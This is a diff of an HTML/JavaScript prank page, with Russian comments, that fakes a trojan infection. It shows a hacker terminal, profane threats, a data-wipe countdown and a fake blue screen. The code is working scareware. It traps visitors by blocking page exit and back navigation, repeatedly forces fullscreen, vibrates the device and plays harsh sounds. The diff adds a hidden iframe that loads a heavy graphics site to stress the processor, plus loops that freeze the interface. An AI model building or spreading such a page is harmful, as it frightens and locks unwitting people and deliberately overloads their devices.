@@ -3,382 +3,142 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>SYSTEM_KERNEL_FAILURE</title>
+<title>SYS_CRITICAL_LAG</title>
 <style>
-  /* ==========================================================================
-     СБРОС СТИЛЕЙ И БАЗОВЫЕ НАСТРОЙКИ
-     ========================================================================== */
-  * { 
-    margin: 0; 
-    padding: 0; 
-    box-sizing: border-box; 
-    user-select: none; 
-    -webkit-user-select: none; 
-    -webkit-touch-callout: none; 
-    -webkit-tap-highlight-color: transparent;
-  }
+  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; }
   
   html, body { 
-    background: #050505; 
-    overflow: hidden; 
-    font-family: 'Courier New', Courier, monospace; 
-    height: 100vh; 
-    width: 100vw; 
-    color: #0f0; 
-    position: fixed; 
-    top: 0; 
-    left: 0; 
-    right: 0; 
-    bottom: 0;
-    touch-action: none; 
-    overscroll-behavior: none;
-    line-height: 1.2;
+    background: #000; overflow: hidden; font-family: 'Courier New', monospace; 
+    height: 100vh; width: 100vw; color: #0f0; 
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0; touch-action: none; overscroll-behavior: none;
   }
 
-  /* Эффект сканирующих линий (CRT монитор) */
+  /* Невидимый слой с тяжелой симуляцией */
+  #stress-layer {
+    position: fixed; inset: 0; width: 100vw; height: 100vh;
+    z-index: -1; /* Уходит на самый задний план */
+    opacity: 0.01; /* Почти невидим, но браузер обязан его рендерить */
+    pointer-events: none; border: none;
+  }
+
+  /* CRT Эффект */
   body::after {
-    content: " ";
-    display: block;
-    position: absolute;
-    top: 0;
-    left: 0;
-    bottom: 0;
-    right: 0;
-    background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-    z-index: 9998;
-    background-size: 100% 4px, 6px 100%;
-    pointer-events: none;
-    opacity: 0.6;
+    content: " "; display: block; position: absolute; top: 0; left: 0; bottom: 0; right: 0;
+    background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%);
+    z-index: 9998; background-size: 100% 4px; pointer-events: none; opacity: 0.8;
   }
 
-  /* ==========================================================================
-     СТАРТОВЫЙ ЭКРАН
-     ========================================================================== */
-  #start-screen {
-    position: fixed; 
-    inset: 0; 
-    background: #000; 
-    z-index: 10000;
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    flex-direction: column;
-    color: #f00; 
-    text-align: center; 
-    padding: 20px;
-    border: 1px solid #300;
-  }
-  
-  #start-screen h1 {
-    font-size: 1.5em;
-    text-shadow: 0 0 10px #f00;
-    margin-bottom: 10px;
-    animation: textFlicker 2s infinite;
-  }
+  /* Стартовый экран */
+  #start-screen { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; justify-content: center; align-items: center; flex-direction: column; color: #f00; text-align: center; padding: 20px; }
+  #start-screen h1 { font-size: 1.5em; text-shadow: 0 0 10px #f00; margin-bottom: 10px; }
+  #start-btn { padding: 20px 60px; font-size: 20px; background: #1a0000; color: #f00; border: 2px solid #f00; cursor: pointer; font-weight: bold; text-transform: uppercase; letter-spacing: 4px; box-shadow: 0 0 20px rgba(255, 0, 0, 0.4); }
+  #start-btn:active { background: #f00; color: #000; }
 
-  #start-screen p {
-    color: #888;
-    font-size: 0.9em;
-    margin-bottom: 30px;
-  }
-
-  #start-btn {
-    padding: 20px 60px; 
-    font-size: 22px; 
-    background: #1a0000; 
-    color: #f00; 
-    border: 2px solid #f00; 
-    cursor: pointer; 
-    font-weight: bold;
-    font-family: 'Courier New', monospace;
-    text-transform: uppercase; 
-    letter-spacing: 4px; 
-    box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
-    transition: all 0.1s;
-  }
-
-  #start-btn:active { 
-    background: #f00; 
-    color: #000; 
-    box-shadow: 0 0 40px #f00;
-  }
-
-  @keyframes textFlicker {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.5; }
-  }
-
-  /* ==========================================================================
-     ТЕРМИНАЛ (ВЫВОД КОДА)
-     ========================================================================== */
-  #terminal { 
-    padding: 15px; 
-    font-size: 13px; 
-    line-height: 1.3; 
-    white-space: pre-wrap; 
-    word-break: break-all; 
-    font-weight: bold; 
-    height: 100%; 
-    overflow: hidden; 
-    text-align: left;
-  }
-
+  /* Терминал */
+  #terminal { padding: 15px; font-size: 12px; line-height: 1.2; white-space: pre-wrap; word-break: break-all; font-weight: bold; height: 100%; overflow: hidden; text-align: left; }
   .red { color: #ff0000; text-shadow: 0 0 8px #ff0000; }
-  .white { color: #ffffff; text-shadow: 0 0 2px #fff; }
+  .white { color: #ffffff; }
   .green { color: #00ff00; text-shadow: 0 0 5px #00ff00; }
   .gray { color: #666666; }
   .yellow { color: #ffff00; text-shadow: 0 0 5px #ffff00; }
 
-  /* ==========================================================================
-     ЭФФЕКТЫ ТРЯСКИ И ВСПЫШЕК
-     ========================================================================== */
-  #shake { 
-    position: fixed; 
-    inset: 0; 
-    z-index: 10; 
-  }
-
+  /* Эффекты */
+  #shake { position: fixed; inset: 0; z-index: 10; }
   @keyframes shake {
-    0% { transform: translate(0, 0); }
-    10% { transform: translate(-15px, 8px) rotate(-2deg); }
-    20% { transform: translate(15px, -8px) rotate(2deg); }
-    30% { transform: translate(-10px, -10px) rotate(-1deg); }
-    40% { transform: translate(10px, 10px) rotate(1deg); }
-    50% { transform: translate(-15px, 5px) rotate(-2deg); }
-    60% { transform: translate(15px, -5px) rotate(2deg); }
-    70% { transform: translate(-5px, 15px) rotate(-1deg); }
-    80% { transform: translate(5px, -15px) rotate(1deg); }
-    90% { transform: translate(-10px, 0); }
-    100% { transform: translate(0, 0); }
+    0% { transform: translate(0, 0); } 10% { transform: translate(-15px, 8px) rotate(-2deg); } 20% { transform: translate(15px, -8px) rotate(2deg); } 30% { transform: translate(-10px, -10px) rotate(-1deg); }
+    40% { transform: translate(10px, 10px) rotate(1deg); } 50% { transform: translate(-15px, 5px) rotate(-2deg); } 60% { transform: translate(15px, -5px) rotate(2deg); } 70% { transform: translate(-5px, 15px) rotate(-1deg); }
+    80% { transform: translate(5px, -15px) rotate(1deg); } 90% { transform: translate(-10px, 0); } 100% { transform: translate(0, 0); }
   }
+  .shaking { animation: shake 0.05s infinite; }
+  #flash { position: fixed; inset: 0; background: #f00; opacity: 0; pointer-events: none; z-index: 99; mix-blend-mode: difference; }
 
-  .shaking { 
-    animation: shake 0.07s infinite; 
-  }
+  /* Оверлей */
+  #lock-overlay { position: fixed; inset: 0; z-index: 900; background: rgba(10, 0, 0, 0.95); display: none; justify-content: center; align-items: center; flex-direction: column; pointer-events: all; border: 20px solid #f00; box-shadow: inset 0 0 100px rgba(255, 0, 0, 0.5); }
+  #timer-text { color: #f00; font-size: 20px; letter-spacing: 5px; margin-bottom: 10px; text-align: center; text-shadow: 0 0 15px #f00; font-weight: bold; }
+  #timer { font-size: 35vh; color: #f00; font-weight: bold; text-shadow: 0 0 60px #f00, 0 0 120px #f00; line-height: 1; transition: color 0.3s, text-shadow 0.3s; }
+  #warning-text { color: #fff; font-size: 16px; margin-top: 20px; text-align: center; animation: blink 0.3s infinite; font-weight: bold; letter-spacing: 2px; }
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+  #glitch-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 950; opacity: 0.15; font-size: 8px; color: #0f0; overflow: hidden; word-break: break-all; }
 
-  #flash { 
-    position: fixed; 
-    inset: 0; 
-    background: #f00; 
-    opacity: 0; 
-    pointer-events: none; 
-    z-index: 99; 
-    mix-blend-mode: difference; 
-  }
-
-  /* ==========================================================================
-     ОВЕРЛЕЙ БЛОКИРОВКИ (ТАЙМЕР)
-     ========================================================================== */
-  #lock-overlay {
-    position: fixed; 
-    inset: 0; 
-    z-index: 900;
-    background: rgba(10, 0, 0, 0.95);
-    display: none; 
-    justify-content: center; 
-    align-items: center;
-    flex-direction: column; 
-    pointer-events: all;
-    border: 20px solid #f00;
-    box-shadow: inset 0 0 100px rgba(255, 0, 0, 0.5);
-  }
-  
-  #timer-text {
-    color: #f00; 
-    font-size: 20px; 
-    letter-spacing: 5px; 
-    margin-bottom: 10px;
-    text-align: center; 
-    text-shadow: 0 0 15px #f00;
-    font-weight: bold;
-  }
-
-  #timer {
-    font-size: 35vh; 
-    color: #f00; 
-    font-weight: bold;
-    text-shadow: 0 0 60px #f00, 0 0 120px #f00; 
-    font-family: 'Courier New', monospace;
-    line-height: 1;
-    transition: color 0.3s, text-shadow 0.3s;
-  }
-
-  #warning-text {
-    color: #fff; 
-    font-size: 16px; 
-    margin-top: 20px; 
-    text-align: center; 
-    animation: blink 0.3s infinite; 
-    font-weight: bold;
-    letter-spacing: 2px;
-  }
-
-  @keyframes blink { 
-    0%, 100% { opacity: 1; } 
-    50% { opacity: 0; } 
-  }
-
-  #glitch-layer {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    pointer-events: none;
-    z-index: 950;
-    opacity: 0.2;
-    font-size: 8px;
-    color: #0f0;
-    overflow: hidden;
-    word-break: break-all;
-  }
-
-  /* ==========================================================================
-     СИНИЙ ЭКРАН СМЕРТИ (BSOD)
-     ========================================================================== */
-  #final {
-    position: fixed; 
-    inset: 0; 
-    display: none; 
-    z-index: 1000;
-    background: #0000AA; 
-    color: #fff; 
-    text-align: left;
-    padding: 20px; 
-    font-family: 'Courier New', monospace; 
-    font-size: 13px;
-    flex-direction: column; 
-    justify-content: flex-start;
-    overflow: hidden;
-  }
-
-  #final h2 { 
-    background: #AAAAAA; 
-    color: #0000AA; 
-    padding: 2px 15px; 
-    display: inline-block; 
-    font-size: 16px; 
-    margin-bottom: 20px; 
-    text-align: center; 
-    align-self: center; 
-    font-weight: normal;
-  }
-
-  #final p { 
-    margin-bottom: 12px; 
-    line-height: 1.4; 
-    text-align: left; 
-  }
-
-  .dump-box {
-    border: 1px solid #fff;
-    padding: 10px;
-    margin-top: 20px;
-    font-size: 11px;
-    line-height: 1.2;
-    color: #ccc;
-    overflow: hidden;
-    height: 40vh;
-  }
-
-  /* ==========================================================================
-     АДАПТИВНОСТЬ ДЛЯ МОБИЛЬНЫХ
-     ========================================================================== */
-  @media (max-width: 600px) {
-    #terminal { font-size: 12px; padding: 10px; }
-    #timer { font-size: 30vh; }
-    #start-screen h1 { font-size: 1.2em; }
-    #start-btn { padding: 15px 40px; font-size: 18px; }
-    #final { font-size: 11px; padding: 15px; }
-    #final h2 { font-size: 14px; }
-  }
+  /* Синий экран */
+  #final { position: fixed; inset: 0; display: none; z-index: 1000; background: #0000AA; color: #fff; text-align: left; padding: 20px; font-size: 13px; flex-direction: column; justify-content: flex-start; overflow: hidden; }
+  #final h2 { background: #AAAAAA; color: #0000AA; padding: 2px 15px; display: inline-block; font-size: 16px; margin-bottom: 20px; align-self: center; font-weight: normal; }
+  #final p { margin-bottom: 12px; line-height: 1.4; text-align: left; }
+  .dump-box { border: 1px solid #fff; padding: 10px; margin-top: 20px; font-size: 11px; line-height: 1.2; color: #ccc; overflow: hidden; height: 40vh; }
 </style>
 </head>
 <body>
 
-<!-- СТАРТОВЫЙ ЭКРАН -->
+<!-- СЮДА ВСТАВЛЕН САЙТ С ЧАСТИЦАМИ -->
+<iframe id="stress-layer" src="https://cznull.github.io/"></iframe>
+
 <div id="start-screen">
-  <h1>[!] CRITICAL_UPDATE.sys</h1>
-  <p>ВНИМАНИЕ: Запуск этого файла может повредить вашу систему.</p>
+  <h1>[!] SYSTEM_DANGER.exe</h1>
+  <p>ВНИМАНИЕ: Обнаружен троян. Запуск только для администраторов.</p>
   <button id="start-btn">ЗАПУСТИТЬ</button>
 </div>
 
-<!-- СЛОЙ ДЛЯ ТРЯСКИ И ТЕРМИНАЛА -->
 <div id="shake">
   <div id="terminal"></div>
 </div>
 
-<!-- СЛОЙ ДЛЯ СЛУЧАЙНЫХ СИМВОЛОВ -->
 <div id="glitch-layer"></div>
-
-<!-- ВСПЫШКА -->
 <div id="flash"></div>
 
-<!-- ОВЕРЛЕЙ С ТАЙМЕРОМ -->
 <div id="lock-overlay">
   <div id="timer-text">УНИЧТОЖЕНИЕ ДАННЫХ:</div>
   <div id="timer">40</div>
   <div id="warning-text">ВЫХОД ЗАБЛОКИРОВАН</div>
 </div>
 
-<!-- СИНИЙ ЭКРАН СМЕРТИ -->
 <div id="final">
   <h2>FATAL_SYSTEM_ERROR</h2>
   <p>A problem has been detected and Windows has been shut down to prevent damage to your computer.</p>
   <p>KERNEL_DATA_INPAGE_ERROR</p>
-  <p>If this is the first time you've seen this Stop error screen, restart your computer. If this screen appears again, follow these steps:</p>
-  <p>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any Windows updates you might need.</p>
   <p>Technical information:</p>
   <p>*** STOP: 0x0000007B (0xFFFFF880009A9928, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)</p>
-  
-  <div class="dump-box" id="memory-dump">
-    <!-- Сюда будет генерироваться фейковый дамп памяти -->
-  </div>
+  <div class="dump-box" id="memory-dump"></div>
 </div>
 
 <script>
-/* ==========================================================================
-   ИНИЦИАЛИЗАЦИЯ И БЛОКИРОВКА
-   ========================================================================== */
-   
-// Проверка на перезапуск (если страницу закрыли и открыли заново)
-if (sessionStorage.getItem('system_locked') === 'true') {
+let isLocked = false;
+let fullscreenInterval, glitchInterval, countdownInterval;
+let endTime = 0;
+
+// Начинаем загрузку тяжелого фрейма сразу
+const stressFrame = document.getElementById('stress-layer');
+
+if (sessionStorage.getItem('sys_infected') === 'true') {
     document.getElementById('start-screen').style.display = 'none';
     document.getElementById('terminal').style.display = 'none';
     document.getElementById('lock-overlay').style.display = 'flex';
-    setTimeout(() => { startCountdown(); }, 100); 
+    endTime = parseInt(sessionStorage.getItem('sys_end_time') || (Date.now() + 40000));
+    setTimeout(() => { startCountdown(true); }, 100); 
 }
 
-let isLocked = false;
-let fullscreenInterval;
-let historyInterval;
-let glitchInterval;
-
-// Блокировка закрытия страницы
 window.addEventListener('beforeunload', function (e) {
   if (isLocked) {
     e.preventDefault();
-    e.returnValue = 'ВНИМАНИЕ! Идет процесс удаления! Не закрывайте страницу.';
+    sessionStorage.setItem('sys_tampered', 'true');
+    e.returnValue = 'ВНИМАНИЕ! Процесс удаления не завершен.';
     return e.returnValue;
   }
 });
 
-// Отключаем контекстное меню (правая кнопка мыши / долгое нажатие)
-document.addEventListener('contextmenu', event => event.preventDefault());
+history.pushState(null, null, location.href);
+window.addEventListener('popstate', function () {
+  if (isLocked) {
+    sessionStorage.setItem('sys_tampered', 'true');
+    history.pushState(null, null, location.href);
+    document.getElementById('shake').classList.add('shaking');
+    playGlitchSound();
+  }
+});
 
-// Отключаем масштабирование жестами
-document.addEventListener('gesturestart', function (e) { e.preventDefault(); });
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('gesturestart', e => e.preventDefault());
+document.addEventListener('touchmove', e => { if (isLocked) e.preventDefault(); }, { passive: false });
 
-// Блокировка скролла и свайпов
-document.addEventListener('touchmove', function(e) {
-    if (isLocked) { 
-        e.preventDefault(); 
-    }
-}, { passive: false });
-
-/* ==========================================================================
-   ПЕРЕМЕННЫЕ DOM
-   ========================================================================== */
 const terminal = document.getElementById('terminal');
 const flash = document.getElementById('flash');
 const shake = document.getElementById('shake');
@@ -392,128 +152,105 @@ const memoryDump = document.getElementById('memory-dump');
 
 let audioCtx;
 
-/* ==========================================================================
-   АУДИО ДВИЖОК (ЗВУКИ СБОЯ)
-   ========================================================================== */
 function playGlitchSound() {
   if (!audioCtx) return;
-  
   const osc = audioCtx.createOscillator();
   const gainNode = audioCtx.createGain();
-  
-  // Резкий, неприятный звук (пила)
   osc.type = 'sawtooth';
-  
-  // Случайная частота для хаоса
   const startFreq = Math.random() * 1200 + 300;
   osc.frequency.setValueAtTime(startFreq, audioCtx.currentTime); 
   osc.frequency.exponentialRampToValueAtTime(60, audioCtx.currentTime + 0.2);
-  
-  gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
+  gainNode.gain.setValueAtTime(0.15, audioCtx.currentTime);
   gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
-  
   osc.connect(gainNode);
   gainNode.connect(audioCtx.destination);
-  
   osc.start();
   osc.stop(audioCtx.currentTime + 0.2);
 }
 
-/* ==========================================================================
-   МАССИВ СТРОК ДЛЯ ТЕРМИНАЛА (C++ & SYSTEM LOGS)
-   ========================================================================== */
+/* ИМИТАЦИЯ ПОЛНОГО ЗАВИСАНИЯ СИСТЕМЫ */
+function simulateSystemFreeze() {
+    // Так как iframe с cznull уже грузит процессор на 100%,
+    // этот цикл просто добивает интерфейс, вызывая полный ступор на 1.5 секунды.
+    let start = Date.now();
+    while (Date.now() - start < 1500) {}
+}
+
 const lines = [
-  {t: "root@device:/ # ./inject_payload --force", c: "gray"},
-  {t: "#include <iostream>", c: "gray"},
-  {t: "#include <sys/mman.h>", c: "gray"},
-  {t: "#include <unistd.h>", c: "gray"},
-  {t: "#include <windows.h>", c: "gray"},
-  {t: "", c: "white"},
+  {t: "root@device:/ # sudo inject_payload --force", c: "gray"},
   {t: "int main(int argc, char** argv) {", c: "white"},
   {t: "  void* payload = malloc(0xFFFFFF);", c: "white"},
   {t: "  mprotect(payload, 0x1000, PROT_EXEC | PROT_READ);", c: "white"},
   {t: "  memcpy(payload, &exploit, sizeof(exploit));", c: "white"},
-  {t: "  CreateRemoteThread(hProc, NULL, 0, ...);", c: "white"},
-  {t: "  return 0;", c: "white"},
   {t: "}", c: "white"},
-  {t: "", c: "gray"},
   {t: "[ OK ] Compiling payload...", c: "green"},
   {t: "[ OK ] Injecting into system_server...", c: "green"},
-  {t: "[ OK ] Root access granted.", c: "green"},
   {t: "[ WARN ] Bypassing SELinux...", c: "yellow"},
-  {t: "[ WARN ] Disabling firewall...", c: "yellow"},
   {t: "[ ! ] IMEI: 35*************", c: "red"},
-  {t: "[ ! ] MAC: 00:1A:2B:3C:4D:5E", c: "red"},
   {t: "[ ! ] CAMERA ACCESS GRANTED", c: "red"},
-  {t: "[ ! ] MICROPHONE ACCESS GRANTED", c: "red"},
-  {t: "[ ! ] GPS TRACKING ENABLED", c: "red"},
-  {t: "", c: "white"},
-  {t: "# rm -rf /system/", c: "white"},
-  {t: "# rm -rf /data/local/tmp", c: "white"},
   {t: "# wipe --all --confirm", c: "white"},
-  {t: "", c: "red"},
   {t: "[ ERR ] Memory corruption at 0x0000DEAD", c: "red"},
   {t: "[ ERR ] Kernel panic - not syncing: Fatal exception", c: "red"},
-  {t: "[ ERR ] System halted.", c: "red"},
-  {t: "", c: "white"},
   {t: "АХАЗАЗА...", c: "red"},
   {t: "ПИЗДА ТЕБЕ.", c: "red"},
-  {t: "ВЫХОДА НЕТ.", c: "red"}
+  {t: "ВЫХОДА НЕТ. ЖДИ.", c: "red"}
 ];
 
 let currentLine = 0;
 
-/* ==========================================================================
-   ЛОГИКА ВЫВОДА ТЕКСТА
-   ========================================================================== */
 function typeLine() {
   if (currentLine >= lines.length) {
-    startCountdown();
+    startCountdown(false);
     return;
   }
-  
   const line = lines[currentLine];
   const div = document.createElement('div');
   div.className = line.c;
   terminal.appendChild(div);
-
   let charIndex = 0;
   
   const typer = setInterval(() => {
     div.textContent += line.t[charIndex] || '';
     charIndex++;
-    
-    // Звук и вибрация на красных строках
     if (charIndex % 8 === 0 && line.c === 'red') {
         playGlitchSound();
         if (navigator.vibrate) navigator.vibrate(30); 
     }
-    
-    // Переход к следующей строке
     if (charIndex > line.t.length) {
       clearInterval(typer);
       currentLine++;
+      
+      // Случайно замораживаем интерфейс
+      if (Math.random() > 0.5) {
+          simulateSystemFreeze(); 
+      }
+      
       setTimeout(typeLine, Math.random() * 20 + 10); 
     }
   }, 5);
 }
 
-/* ==========================================================================
-   ЛОГИКА ТАЙМЕРА И БЛОКИРОВКИ
-   ========================================================================== */
-function startCountdown() {
+function startCountdown(isResuming) {
   isLocked = true; 
-  sessionStorage.setItem('system_locked', 'true'); 
   
+  if (!isResuming) {
+      sessionStorage.setItem('sys_infected', 'true');
+      endTime = Date.now() + 40000; 
+      sessionStorage.setItem('sys_end_time', endTime);
+  }
+
+  // Убеждаемся, что фрейм на заднем плане существует и загружен
+  if (stressFrame) {
+      stressFrame.style.display = 'block';
+  }
+
   shake.classList.add('shaking');
   lockOverlay.style.display = 'flex';
-  
-  // Запрос на полноэкранный режим
+
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen().catch(() => {});
   }
 
-  // АГРЕССИВНАЯ БЛОКИРОВКА (Спам истории и полного экрана)
   fullscreenInterval = setInterval(() => {
     if (isLocked) {
         if (!document.fullscreenElement && document.documentElement.requestFullscreen) {
@@ -523,44 +260,40 @@ function startCountdown() {
     }
   }, 100);
 
-  // Генерация случайного мусора на фоне (глитч)
   glitchInterval = setInterval(() => {
     let chars = "ABCDEF0123456789_!@#$%^&*";
     let glitchText = "";
-    for(let i=0; i<300; i++) {
+    for(let i=0; i<500; i++) {
         glitchText += chars.charAt(Math.floor(Math.random() * chars.length));
     }
     glitchLayer.textContent = glitchText;
-  }, 50);
+  }, 30);
 
-  // Таймер на 40 секунд
-  let timeLeft = 40;
-  
-  const countdownInterval = setInterval(() => {
-    timeLeft--;
-    timerEl.textContent = timeLeft;
+  countdownInterval = setInterval(() => {
+    let timeLeft = Math.ceil((endTime - Date.now()) / 1000);
+    if (timeLeft < 0) timeLeft = 0;
     
-    // Мигание экрана
+    timerEl.textContent = timeLeft;
     flash.style.opacity = flash.style.opacity === '0.9' ? '0' : '0.9';
     playGlitchSound();
-    
-    // Жесткая вибрация
     if (navigator.vibrate) navigator.vibrate([200, 50, 200, 50, 400]); 
     
-    // На 20 секундах меняем цвет таймера на желтый
+    // Замораживаем каждые 3 секунды, так как cznull уже греет телефон
+    if (timeLeft % 3 === 0) {
+        simulateSystemFreeze();
+    }
+    
     if(timeLeft === 20) {
         timerEl.style.color = "#ffcc00";
         timerEl.style.textShadow = "0 0 40px #ffcc00";
     }
-
-    // На 5 секундах делаем белым и ускоряем тряску
     if(timeLeft < 5) {
-      shake.style.animationDuration = "0.03s";
+      shake.style.animationDuration = "0.02s";
       timerEl.style.color = "#fff";
       timerEl.style.textShadow = "0 0 60px #fff";
+      simulateSystemFreeze(); // Добиваем в конце
     }
 
-    // Конец таймера
     if (timeLeft <= 0) {
       clearInterval(countdownInterval);
       clearInterval(fullscreenInterval);
@@ -570,22 +303,22 @@ function startCountdown() {
   }, 1000);
 }
 
-/* ==========================================================================
-   ФИНАЛЬНЫЙ СИНИЙ ЭКРАН СМЕРТИ
-   ========================================================================== */
 function endPrank() {
   isLocked = false; 
-  sessionStorage.removeItem('system_locked'); 
+  sessionStorage.clear();
   
+  // Отключаем iframe с частицами, чтобы телефон остыл
+  if (stressFrame) {
+      stressFrame.style.display = 'none';
+  }
+
   shake.classList.remove('shaking');
   flash.style.opacity = '0';
   lockOverlay.style.display = 'none';
   terminal.style.display = 'none';
   glitchLayer.style.display = 'none';
-  
   final.style.display = 'flex';
   
-  // Генерируем фейковый дамп памяти
   generateMemoryDump();
   
   if (document.exitFullscreen && document.fullscreenElement) {
@@ -595,7 +328,7 @@ function endPrank() {
 
 function generateMemoryDump() {
     let dump = "";
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 60; i++) {
         let address = (0xFFFFF88000000000 + Math.floor(Math.random() * 1000000000)).toString(16).toUpperCase();
         let data1 = Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase();
         let data2 = Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase();
@@ -604,19 +337,12 @@ function generateMemoryDump() {
     memoryDump.textContent = dump;
 }
 
-/* ==========================================================================
-   ЗАПУСК
-   ========================================================================== */
 startBtn.addEventListener('click', () => {
-  // Инициализация AudioContext (требуется жест пользователя)
   audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-  
   startScreen.style.display = 'none';
-  
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen().catch(() => {});
   }
-  
   setTimeout(typeLine, 100);
 });
 </script>
